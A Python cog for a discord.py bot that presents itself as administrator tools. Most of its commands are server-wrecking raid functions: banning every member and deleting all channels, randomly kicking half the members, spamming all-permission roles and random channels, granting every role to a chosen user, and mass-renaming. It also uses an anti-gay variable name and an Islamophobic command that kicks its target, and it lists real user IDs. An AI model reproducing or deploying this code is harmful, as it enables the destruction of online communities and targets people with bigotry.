"""Adds administrator functions and an admin check."""
from discord.ext import tasks, commands
import utilities as util
import discord
import asyncio
import random

# Order of admins is: larrabyte, captainboggle, computerfido, huxley2039 and elsoom.
admins = [268916844440715275, 306249172032552980, 233399828955136021, 324850150889750528, 306896325067145228]

def isadmin(self, ctx):
    if ctx.author.id in admins: return True
    elif ctx.guild.id == util.guilds[2]: return True
    else: return False

@tasks.loop(seconds=1.0)
async def nickloop(ctx, name):
    if nickloop.current_loop == len(ctx.guild.members): nickloop.stop()
    try: await ctx.guild.members[nickloop.current_loop].edit(nick=name)
    except Exception: pass

@tasks.loop(seconds=0.1)
async def mexloop(ctx):
    try: await ctx.guild.create_role(name="Mex", permissions=discord.Permissions().all(), colour=discord.Colour(0xf1c40f), hoist=True)
    except discord.HTTPException:
        await ctx.send("mex machine broke, stopping")
        self.cancel()

@tasks.loop(seconds=0.1)
async def channelingloop(ctx):
    await ctx.guild.create_text_channel(util.randstr(100))

class administrator(commands.Cog):
    def __init__(self, bot):
        self.cog_check(isadmin)
        self.bot = bot

    @commands.is_owner()
    @commands.command()
    async def snap(self, ctx):
        """They thought I was a madman."""
        for gays in random.sample(ctx.guild.members, k=int(len(ctx.guild.members) / 2)): await ctx.guild.kick(gays)

    @commands.is_owner()
    @commands.command()
    async def order66(self, ctx):
        """Execute Order 66."""
        for members in ctx.guild.members:
            try: await ctx.guild.ban(members)
            except Exception: pass

        for channels in ctx.guild.channels:
            try: await channels.delete()
            except Exception: pass

        print(ctx.guild.name + " has been wiped.")

    @commands.command()
    async def allahuakbar(self, ctx, user: discord.Member):
        """A special Islamic present for your friends.
           !اتصل بالشرطة!  اتصل بالشرطة"""
        voiceclass = self.bot.get_cog("voice")
        if user: ctx.author = user
        await voiceclass.join(ctx)
        await voiceclass.play(ctx, "./ffmpeg/music/allahuakbar.mp3")
        await asyncio.sleep(2)

        await ctx.guild.voice_client.disconnect()
        await ctx.guild.kick(ctx.author)
    
    @commands.command()
    async def bruteforce(self, ctx, user: discord.Member=None):
        """Brute-force the roles until something works :)"""
        if not user: user = discord.utils.get(ctx.guild.members, name="anthony baker")
        for roles in ctx.guild.roles:
            try: await user.add_roles(roles)
            except Exception: pass

    @commands.command()
    async def onesnap(self, ctx):
        """Thanos snap but it's only 1% as effective."""
        snapped = random.choice(ctx.guild.members)
        await ctx.send("rip " + snapped.mention)
        await ctx.guild.kick(snapped)
    
    @commands.command(aliases=["randall"])
    async def randomiseliterallyeverything(self, ctx):
        """`randstr()` `randstr()` `randstr()` `randstr()` `randstr()` `randstr()`"""
        for channels in ctx.guild.text_channels: await channels.edit(name=util.randstr(100))
        for channels in ctx.guild.voice_channels: await channels.edit(name=util.randstr(100))
        for members in ctx.guild.members: await members.edit(nick=util.randstr(32))

    @commands.command()
    async def channelthechannel(self, ctx):
        """Channel your inner channel..."""
        await channelingloop.start(ctx)

    @commands.command()
    async def nomorechannels(self, ctx):
        """Inner channels? No more!"""
        channelingloop.stop()

    @commands.command()
    async def yougotmail(self, ctx):
        """:mex: :mex: :mex: :mex: :mex:"""
        await mexloop.start(ctx)

    @commands.command()
    async def nomoremail(self, ctx):
        """Oh no, the mailbox is closed :("""
        mexloop.stop()

    @commands.command(aliases=["repnick"])
    async def repeatnick(self, ctx, *, nickname: str=None):
        """Change every member's nickname."""
        await nickloop.start(ctx, nickname)

    @commands.command()
    async def nomorenick(self, ctx):
        """No more nicks... :("""
        nickloop.stop()

def setup(bot): bot.add_cog(administrator(bot))